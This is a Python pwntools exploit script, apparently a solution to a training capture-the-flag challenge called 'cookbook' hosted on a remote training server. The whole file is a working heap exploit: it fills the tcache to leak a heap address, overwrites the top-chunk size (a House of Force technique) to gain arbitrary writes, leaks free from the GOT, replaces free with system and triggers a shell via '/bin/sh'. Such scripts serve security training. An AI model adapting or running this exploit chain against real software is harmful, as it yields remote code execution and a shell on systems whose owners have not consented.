import pwn
import ctypes

pwn.context.terminal = ['gnome-terminal', '-e']
pwn.context.arch = 'i386'

ADDRESS_SIZE = 4

# r = pwn.process('./cookbook', env={'LD_PRELOAD': './libc-2.27.so'})

r = pwn.remote('training.jinblack.it', 2017)

free_current_ingredient = 0x08048e06
new_ingredient_malloc = 0x08048dbb
cookbook_malloc = 0x08048bbc
set_calories_free = 0x08048fce
give_recipe_name_null_check = 0x08049434
recipe_addr = 0x0804d0a0
free_got = 0x0804d018

breaks = f"""
    watch *{free_got}
    watch *{recipe_addr}
    b *{give_recipe_name_null_check}
    b *{set_calories_free}
    b *{cookbook_malloc}
"""

# pwn.gdb.attach(r, f"""
#     c
# """)

input("wait")

END_OF_MENU = "[q]uit\n"
END_OF_INGREDIENT_MENU = "[e]xport saving changes (doesn't quit)?\n"

def start():
    r.recvuntil("what's your name?\n")
    r.sendline("hackerman")
    r.recvuntil(END_OF_MENU)

def create_recipe():
    r.sendline("c")
    r.recvuntil(END_OF_MENU)
    r.sendline("n")
    r.recvuntil(END_OF_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def name_recipe(name, wait=True):
    r.sendline("c")
    if wait:
        r.recvuntil(END_OF_MENU)
    r.sendline("g")
    r.sendline(name)
    if wait:
        r.recvuntil(END_OF_MENU)
    r.sendline("q")
    if wait:
        r.recvuntil(END_OF_MENU)

def create_ingredient():
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("n")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def set_ingredient_calories(calories):
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("s")
    r.sendline(str(calories))
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def name_ingredient(name):
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("g")
    r.sendline(name)
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def save_ingredient():
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("e")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def exterminate_ingredient(name):
    r.sendline("e")
    r.recvuntil("which ingredient to exterminate? ")
    r.sendline(name)
    r.recvuntil(END_OF_MENU)

def list_ingredient_stats():
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("l")
    r.recvuntil("calories: ")
    leak = int(r.recvuntil("\n")[:-1])
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)
    return leak

def delete_current_new_ingredient():
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("d")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def name_cookbook(name_size, name, wait=True):
    r.sendline("g")
    if wait:
        r.recvuntil("how long is the name of your cookbook? (hex because you're both a chef and a hacker!) : ")
    r.sendline(hex(name_size))
    r.sendline(name)
    if wait:
        r.recvuntil("the new name of the cookbook is ")
        leak = r.recvuntil("\n")[:-1]
        r.recvuntil(END_OF_MENU)
        return leak

def leak_name():
    END_MARK = "'s cookbook"
    r.sendline('r')
    leak = r.recvuntil(END_MARK)[:-len(END_MARK)]
    r.recvuntil(END_OF_MENU)
    return leak

def remove_cookbook():
    r.sendline("R")

RECIPE_INSTRUCTIONS_BUF_SIZE = 0x330
OFFSET_FROM_INSTRUCTIONS_TO_TOP_CHUNK_SIZE = 0x50

new_top_chunk_size = 0xffffffff

start()

T_CACHE_LIMIT = 7

# fill t cache to force next allocation to be contained in a bin, which has an address to the next chunk in the heap
for i in range(T_CACHE_LIMIT):
    create_ingredient()
    name_ingredient(str(i))
    save_ingredient()

for i in range(T_CACHE_LIMIT):
    exterminate_ingredient(str(i))

heap_leak_once = 0x8699a90
top_chunk_addr_once = 0x869a118

top_chunk_offset_from_leak = top_chunk_addr_once - heap_leak_once

create_ingredient()
heap_leak = list_ingredient_stats()
curr_top_chunk_addr = heap_leak + top_chunk_offset_from_leak

print("heap leak:")
print(hex(heap_leak))
print("top_chunk_addr:")
print(hex(curr_top_chunk_addr))

# empty ingredient and buffer tcache to make sure we can make small allocations that will target the top chunk
# otherwise we will get an already allocated chunk in tcache
for i in range(T_CACHE_LIMIT - 1):
    create_ingredient()

for i in range(T_CACHE_LIMIT):
    name_cookbook(0x80, b"A")

create_recipe()
name_recipe(b"A" * RECIPE_INSTRUCTIONS_BUF_SIZE + b"B" * OFFSET_FROM_INSTRUCTIONS_TO_TOP_CHUNK_SIZE + pwn.p32(new_top_chunk_size))

def pseudo_arbitrary_write(next_address, data, wait=True):
    global curr_top_chunk_addr
    CHUNK_OFFSET = 8
    CHUNK_OVERHEAD = 0x11
    next_address = next_address - CHUNK_OFFSET
    alloc_size = ctypes.c_uint(next_address - curr_top_chunk_addr - CHUNK_OVERHEAD).value
    fgets_n = ctypes.c_int(alloc_size).value
    print(f"Allocating {hex(alloc_size)} bytes")
    print(f"Allocated address should be {hex(curr_top_chunk_addr + CHUNK_OFFSET)}")
    if fgets_n < 0:
        print("Moving top_chunk, but not writing anything as fgets size is negative")
    else:
        print(f"writing {pwn.binascii.hexlify(data)} to {hex(curr_top_chunk_addr + CHUNK_OFFSET)}")
    leak = name_cookbook(alloc_size, data, wait=wait)
    curr_top_chunk_addr = ctypes.c_uint(curr_top_chunk_addr + alloc_size + CHUNK_OVERHEAD).value
    print(f"next top_chunk address = {hex(curr_top_chunk_addr)}")
    return leak

# top chunk moves in multiples of 16
def align_to_16_bytes(addr):
    return (addr // 16) * 16

OFFSET_FROM_RECIPE_START_TO_INSTRUCTIONS = 140
new_ingredient_addr = 0x0804d09c
closest_addr_to_new_ingredient_addr = align_to_16_bytes(new_ingredient_addr)
offset_from_closes_addr_to_new_ingredient = new_ingredient_addr - closest_addr_to_new_ingredient_addr

# the instruction buffer of the recipe will land on top of the address of the global new_ingredient
# for this, we need to give the recipe pointer a pointer to the new_ingredient address MINUS the offset of the instructions inside the recipe
# when we get the instructions member from the recipe the offset is added and we are on top of the new_ingredient address
pseudo_arbitrary_write(recipe_addr, b"ABCD")
print("moved top chunk")
pseudo_arbitrary_write(recipe_addr + 0x200, pwn.p32(new_ingredient_addr - OFFSET_FROM_RECIPE_START_TO_INSTRUCTIONS))
print("arbitrary write set up")
pseudo_arbitrary_write(recipe_addr + 0x500, b"")

def arbitrary_write(addr, data):
    print(f"Arbitrary write: writing {hex(pwn.u32(data))} to {hex(addr)}")
    name_recipe(pwn.p32(addr))
    set_ingredient_calories(ctypes.c_int(pwn.u32(data)).value)

# For some reason, fgets overwrites the recipe pointer after an arbitrary write, so we need to flip the next arbitrary writes to
# use the ingredient for the addressing and the recipe for writing the data.
# Doing this from the beginning was not possible because the inaccurate writing with the top chunk overrites addresses above new_instruction which causes problems.
# Recipe is 16byte aligned so writing to it was precise.
arbitrary_write(new_ingredient_addr, pwn.p32(recipe_addr))
print("arbitrary write flipped")

def arbitrary_write_2(addr, data):
    print(f"Arbitrary write: writing {hex(pwn.u32(data))} to {hex(addr)}")
    set_ingredient_calories(ctypes.c_int(addr - OFFSET_FROM_RECIPE_START_TO_INSTRUCTIONS).value)
    name_recipe(data)
    
name_addr = 0x0804d0ac
arbitrary_write_2(name_addr, pwn.p32(free_got))
print("arbitrary write done")

free_leak = pwn.u32(leak_name()[:ADDRESS_SIZE])
print("free_leak:")
print(hex(free_leak))

free_leak_once = 0xf7e43250
system_once = 0xf7e05200
system_offset_from_leak = system_once - free_leak_once

system_addr = free_leak + system_offset_from_leak

print("system_addr:")
print(hex(system_addr))

puts_got = 0x804d030
cookbook_addr = 0x0804d0a8
name_cookbook(0x20, "/bin/sh\x00")
print("cookbook named")
arbitrary_write_2(free_got, pwn.p32(system_addr))
print("replaced free with system")
remove_cookbook()

r.interactive()